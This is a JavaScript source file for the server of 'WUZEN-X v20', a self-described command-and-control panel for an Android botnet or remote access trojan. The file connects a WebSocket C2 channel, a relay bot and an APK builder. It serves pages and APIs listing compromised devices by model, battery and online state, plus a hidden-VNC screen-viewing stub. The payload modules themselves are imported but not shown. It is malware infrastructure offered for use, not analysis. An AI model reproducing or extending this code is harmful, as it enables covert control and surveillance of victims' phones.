import express from 'express';
import http from 'http';
import { WebSocketServer } from 'ws';
import { C2 } from './c2.js';
import { WuzenBot } from './bot.js';
import { ApkBuilder } from './apk-builder.js';
import { config } from './config.js';

const c2 = new C2();
const apkBuilder = new ApkBuilder();

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });
c2.attachWss(wss);

const wuzen = new WuzenBot(c2, apkBuilder);
wuzen.launch();

c2.on('event', (type, data) => wuzen.sendToChannel(type, data));

app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><title>WUZEN-X v20</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#0a0a12;color:#00ffcc;font-family:monospace;padding:20px}h1{color:#ff2ec4;text-shadow:0 0 12px #ff2ec4}.stat{font-size:1.3em;margin:10px 0}</style></head><body><h1>☠️ WUZEN-X v20.0</h1><p class="stat">C2 ONLINE — <span id="n">0 online / 0 total</span></p><script>setInterval(async()=>{const r=await fetch('/api/stats');const j=await r.json();document.getElementById('n').textContent=j.online+' online / '+j.total;},3000)</script></body></html>`);
});

app.get('/api/stats', (req, res) => {
  res.json({
    online: c2.getOnlineCount(),
    total: c2.getTotalCount(),
    devices: c2.getDevices().map((d) => ({
      id: d.id, model: d.info?.model, battery: d.info?.battery, online: d.online
    }))
  });
});

app.get('/api/devices', (req, res) => res.json(c2.getDevices()));

app.get('/dashboard', (req, res) => {
  const { u, p } = req.query;
  if (u !== config.dashboardUser || p !== config.dashboardPass) {
    return res.status(401).send('401 — auth required. Use /dashboard?u=user&p=pass');
  }
  const rows = c2.getDevices().map((d) =>
    `<tr><td>${d.online ? '🟢' : '🔴'}</td><td>${d.id}</td><td>${d.info?.model || '?'}</td><td>${d.info?.battery ?? '?'}%</td></tr>`
  ).join('') || '<tr><td colspan="4">No devices</td></tr>';
  res.send(`<!DOCTYPE html><html><head><title>WUZEN-X Dashboard</title><meta charset="utf-8"><style>body{background:#0a0a12;color:#00ffcc;font-family:monospace;padding:20px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #222;padding:8px;text-align:left}</style></head><body><h1>☠️ WUZEN-X — DEVICES</h1><table><tr><th>State</th><th>ID</th><th>Model</th><th>Battery</th></tr>${rows}</table><script>setInterval(()=>location.reload(),5000)</script></body></html>`);
});

app.get('/hvnc/:id', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><title>HVNC</title></head><body style="background:#000;color:#0f0;font-family:monospace"><h2>🎥 HVNC — ${req.params.id}</h2><p>Stream endpoint ready (feed wired in v20.1)</p></body></html>`);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🌐 WUZEN-X C2 up on :${PORT}`));
